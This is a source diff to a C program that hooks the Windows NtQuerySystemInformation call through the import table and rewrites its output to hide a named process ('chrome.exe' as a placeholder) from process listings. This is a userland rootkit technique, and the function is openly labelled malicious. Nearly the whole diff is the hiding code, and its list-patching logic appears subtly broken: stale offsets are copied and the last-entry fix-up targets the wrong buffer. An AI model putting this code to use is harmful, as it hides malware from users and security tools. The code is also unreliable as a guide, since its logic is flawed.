@@ -2,6 +2,10 @@
 #include <stdio.h>
 #include <string.h>
 #include <winternl.h>
+#include <stdbool.h>
+
+
+#pragma comment(lib,"ntdll.lib")
 
 
 //type of "NtQuerySystemInformation"
@@ -81,7 +85,51 @@ void hook_function(IMAGE_THUNK_DATA32* thunk, NtQuerySystemInformationFuncType M
 
 NTSTATUS __stdcall MaliciousNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength) {
 	printf("%s\r\n", "[*] This is the attacker...");
-	//TODO rewrite the function...
+	if (SystemInformationClass != SystemProcessInformation) {
+		return realNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
+	}
+
+	int returnLength = 0;
+	SYSTEM_PROCESS_INFORMATION* processesBuffer = (SYSTEM_PROCESS_INFORMATION*) malloc(SystemInformationLength);
+	SYSTEM_PROCESS_INFORMATION* startOfProcessesBuffer = processesBuffer;
+
+	NTSTATUS status = NtQuerySystemInformation(SystemInformationClass, (PVOID) processesBuffer, SystemInformationLength, &returnLength);
+	
+	if (NT_SUCCESS(status)) {
+		//The first entry is the System Idle Process so we do not need to take care of it.
+		memcpy(SystemInformation, processesBuffer, processesBuffer->NextEntryOffset);
+		SYSTEM_PROCESS_INFORMATION* lastProcessInfo = processesBuffer; //save the last process that had been copied, in order to maintain NextEntryOffset member in case the last process is hidden
+		byte isLastHidden = 1;
+		SystemInformation = ((byte*) SystemInformation) + processesBuffer->NextEntryOffset;
+
+		while (processesBuffer->NextEntryOffset != 0) { //traverse the process list until we reach the end
+			processesBuffer = ((byte*) processesBuffer) + processesBuffer->NextEntryOffset;
+			if (wcscmp(L"chrome.exe", processesBuffer->ImageName.Buffer) != 0) { //replace "chrome.exe" with the name of the process to hide
+				
+				//allocate a new buffer for the name of the process so the user will be able to read the string
+				wchar_t* newBuffer = (wchar_t*) malloc((wcslen(processesBuffer->ImageName.Buffer) + 1) * sizeof(wchar_t));
+				wcscpy_s(newBuffer, wcslen(processesBuffer->ImageName.Buffer) + 1, processesBuffer->ImageName.Buffer);
+				processesBuffer->ImageName.Buffer = newBuffer;
+
+				if (processesBuffer->NextEntryOffset != 0) { //if this is not the last process in the buffer, proceed further
+					memcpy(SystemInformation, processesBuffer, processesBuffer->NextEntryOffset);
+					SystemInformation = ((byte*) SystemInformation) + processesBuffer->NextEntryOffset;
+				} else {									 //else, copy the rest of the buffer and mark that the last process is not hidden
+					memcpy(SystemInformation, processesBuffer, SystemInformationLength - (((byte*) processesBuffer) - ((byte*) startOfProcessesBuffer)));
+					isLastHidden = 0;
+				}
+			}
+		}
+
+		//set NextEntryOffset member of the last process that is not hidden to 0, if necessary
+		if (isLastHidden == 1) {
+			lastProcessInfo->NextEntryOffset = 0;
+		}
+	}
+	
+	free(startOfProcessesBuffer);
+	*(ReturnLength) = returnLength;
+	return status;
 }
 
 
